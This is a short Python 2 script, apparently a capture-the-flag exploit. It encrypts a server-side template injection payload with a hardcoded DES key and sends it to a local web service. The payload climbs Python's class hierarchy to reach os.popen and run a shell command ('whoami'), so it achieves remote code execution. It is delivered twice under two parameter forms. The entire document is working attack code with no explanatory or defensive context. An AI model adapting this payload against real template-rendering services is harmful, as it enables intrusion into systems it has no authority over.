import requests
import urlparse
from Crypto.Cipher import DES

KEY = 'megnnaro'


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length
    cipher = DES.new(KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')


payload = encrypt(
    "m=p&l=${[].__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('whoami').read()}")
url = 'http://127.0.0.1:8080/?s=' + payload
print url
r = requests.get(url)
payload = encrypt(
    "m=r&u=${[].__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('whoami').read()}")
url = 'http://127.0.0.1:8080/?s=' + payload
print url
r = requests.get(url)
# print r.content
